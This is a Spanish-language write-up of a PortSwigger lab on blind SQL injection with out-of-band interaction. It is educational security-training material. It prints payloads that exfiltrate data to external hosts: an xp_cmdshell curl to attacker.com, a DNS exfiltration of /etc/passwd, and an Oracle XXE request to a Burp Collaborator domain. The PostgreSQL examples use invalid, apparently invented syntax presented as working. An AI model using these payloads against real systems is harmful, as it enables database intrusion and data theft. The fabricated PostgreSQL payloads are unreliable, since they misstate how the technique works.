---
title: "15 Blind SQL injection with out-of-band interaction"
collection: publications
category: portswigger
permalink: publications/SQLi/15_Blind SQL injection with out-of-band interaction
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, explotamos la vulnerabilidad de inyección SQL para provocar una búsqueda DNS a Burp Collaborator.'
date: 2024-12-02
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with out-of-band interaction'
---

# Explicación de este tipo de ataque

Blind SQL Injection con Interacción Out-of-Band (OOB) es una técnica avanzada de inyección SQL que permite exfiltrar datos de una base de datos a través de canales secundarios, en lugar de depender de la respuesta directa de la aplicación web. Esta técnica se utiliza cuando:

* La respuesta de la aplicación no refleja directamente los resultados de la consulta SQL.
* No se pueden usar demoras basadas en tiempo (time-based blind SQLi).

En estos casos, puedes enviar cargas útiles que generen solicitudes hacia servicios externos (como un servidor controlado por el atacante) para confirmar que la inyección SQL ha sido exitosa o para extraer información.

# ¿Cómo funciona?

En lugar de buscar una respuesta directa o medir tiempos de demora, se aprovechan funciones que permiten realizar interacciones de red o de sistema operativo desde la base de datos hacia un recurso externo. Estas interacciones pueden incluir:

* Realizar una solicitud HTTP/DNS hacia un servidor externo controlado por el atacante.
* Usar comandos del sistema operativo (si la base de datos permite su ejecución) para interactuar con servicios externos.

# Casos comunes de interacción Out-of-Band

## 1. Exfiltración DNS
Se utilizan funciones de la base de datos para realizar una consulta DNS hacia un servidor controlado por el atacante. El nombre de dominio puede codificar datos exfiltrados, como nombres de tablas, columnas o datos específicos.

Ejemplo en PostgreSQL:

```sql
' || (SELECT extract(dns FROM pg_read_file('/etc/passwd') INTO '[your-server].attacker.com'))--
```

En este caso:

* La carga útil fuerza a la base de datos a realizar una consulta DNS hacia un servidor del atacante `(your-server.attacker.com)`.
* El atacante puede capturar esta interacción en su servidor DNS y decodificar los datos exfiltrados.

## 2. Uso de solicitudes HTTP

Algunas bases de datos permiten realizar solicitudes HTTP. Estas solicitudes se pueden usar para enviar datos al atacante.

Ejemplo en Microsoft SQL Server `(usando xp_cmdshell)`:

```sql
'; exec xp_cmdshell 'curl http://attacker.com?data=(SELECT TOP 1 name FROM sysobjects WHERE xtype=''U'')'; --
```

En este caso:

* Se usa `xp_cmdshell` para ejecutar un comando del sistema operativo.
* `curl` realiza una solicitud HTTP hacia el servidor del atacante con el primer nombre de tabla.

## Registros DNS o HTTP dinámicos

En algunos casos, los datos pueden ser exfiltrados directamente como parte del nombre del dominio o parámetros HTTP. Por ejemplo:

Si intentas extraer el nombre de una tabla llamada `users`:

```sql
' || (SELECT pg_sleep(0) WHERE table_name='users' INTO '[users.attacker.com]')--
```

# Beneficios de la interacción Out-of-Band
* No requiere respuesta directa: Es útil cuando las respuestas de la aplicación no reflejan los resultados de la consulta SQL.
* Bypass de restricciones: Puede eludir restricciones en la aplicación o WAFs que bloqueen consultas SQL convencionales.
* Exfiltración indirecta: Permite extraer datos incluso si no se muestran directamente en la aplicación.

# Limitaciones
* Requiere acceso a funciones específicas: Como consultas DNS, HTTP o comandos del sistema operativo, que pueden estar deshabilitadas por configuraciones de seguridad.
* Visibilidad: Las interacciones de red hacia dominios externos pueden ser detectadas por sistemas de monitoreo (IDS/IPS).

![logo]({{site.url}}/images/SQLi/sqli-15/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-15/descripcion.png)

## Objetivo del laboratorio

Explotar una vulnerabilidad SQLi y provocar una busqueda DNS.

## Abrir el Burp Collaborator client

Abrimos el `collaborator` de Burp Suite y presionamos en `Copy to clipboard` nos copiara un dato y lo guardamos. Es un `servidor` donde llegaran las consultas.

`c2fsi8n5y9x07iboz6x97z124takybm0.oastify.com`

![Collaborator]({{site.url}}/images/SQLi/sqli-15/collaborator.png)

## Cheat Sheet

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![Cheat]({{site.url}}/images/SQLi/sqli-15/cheat.png)

Vamos a probar cada uno de los Payloads que nos proporciona la pagina a ver con que motor esta corriendo.

```sql
'|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SERVIDOR-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)--
```

![Payload]({{site.url}}/images/SQLi/sqli-15/payload.png)

Y revisamos la pestaña de `Collaborator` y presionamos `Poll now` para recibir las peticiones. Y vemos que hemos recibido el datos de la consulta.

![Poll]({{site.url}}/images/SQLi/sqli-15/poll.png)

# Aprobado

![Aprobado]({{site.url}}/images/SQLi/sqli-15/aprobado.png)

